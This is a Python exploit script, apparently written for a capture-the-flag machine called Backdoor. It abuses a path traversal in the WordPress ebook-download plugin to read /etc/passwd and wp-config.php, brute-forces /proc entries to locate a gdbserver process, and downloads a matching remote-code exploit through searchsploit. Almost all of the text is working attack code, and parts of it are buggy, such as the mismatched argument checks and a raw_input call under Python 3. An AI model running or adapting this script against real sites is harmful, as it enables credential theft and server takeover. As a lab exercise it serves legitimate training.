# Backdoor box exploit script by VIKSANT

# ########################################################
# Recommended to read files: /etc/passwd and /wp-config.php
# ########################################################


#!/usr/bin/python3
import sys


from pwn import *
import argparse
import requests
import re

def def_handler(sig, frame):
    print("[!] Aborting...")
    sys.exit(1)

if len(sys.argv) != 6:
    print("Uso: python3 pruebas.py -t <IP> -d <Directory> -r <Request Mode> / -s <searchsploit Mode>")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", required=True, help="Target's IP")
parser.add_argument("-d", "--directory", required=True, help="Directory")
parser.add_argument("-c", "--curl", action="store_true", help="curl")
parser.add_argument("-s", "--searchsploit", default=argparse.SUPPRESS, help="searchsploit Mode")

args = parser.parse_args()
ip_address = args.target
directory = args.directory

def download_exploit():

    exploit = input("What service exploit do you need? : ")
    output = subprocess.check_output(["searchsploit", exploit.strip()])
    print(output.decode('utf-8'))
    output_str = output.decode('utf-8')
    output_lines = output_str.splitlines()

    if "Exploits: No Results" in output_str:
        print("There are no exploits for this service")
        sys.exit(1)

    print("##################################################################################")
    eleccion = raw_input("Select exploit number : ")
    print("##################################################################################\n")

    exploit_index = (output_lines[2+int(eleccion)])
    file_path = os.popen(f"echo \'{exploit_index}\' | awk '{{print $NF}}'").read().strip()

    os.system(f"searchsploit -m {file_path}")

def make_request():

    test = os.popen(f"curl -s -X GET http://{ip_address}/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/../../..{directory}").read()
    words = len(test)
    if words == 100:
        test = os.popen(f"curl -s -X GET http://{ip_address}/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../..{directory}").read()
    print(test)

def BruteForce():
    main_url = f"http://{ip_address}/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="
    p1 = log.progress("Brute Force Status")
    for i in range(1, 1000):
        p1.status("Trying " + str(i))
        url = main_url + "/proc/" + str(i) + "/cmdline"
        r = requests.get(url)
        if len(r.content) > 82:
            print("------------------------------------------")
            log.info("Found PID: " + str(i))
            string = r.content
            pattern = r"x00|script>window\.close\(\)</script>"
            new_string = re.sub(pattern, "", string.decode())
            print(new_string)
            if "gdbserver" in new_string:
                print("gdbserver process found at line " + str(i))
                break
            print("------------------------------------------")

if __name__ == "__main__":

    if "-c" in sys.argv:
        make_request()
    elif "-s" in sys.argv:
        download_exploit()
    print("\n\n")
    print("Brute Forcing...")
    time.sleep(2)

    BruteForce()

    print("Downloading gdbserver exploit...")
    time.sleep(1)

    os.system("searchsploit -m linux/remote/50539.py")
    os.system("mv 50539.py gdbserver_exploit.py")

    time.sleep(1)
    print("Exploit downloaded")

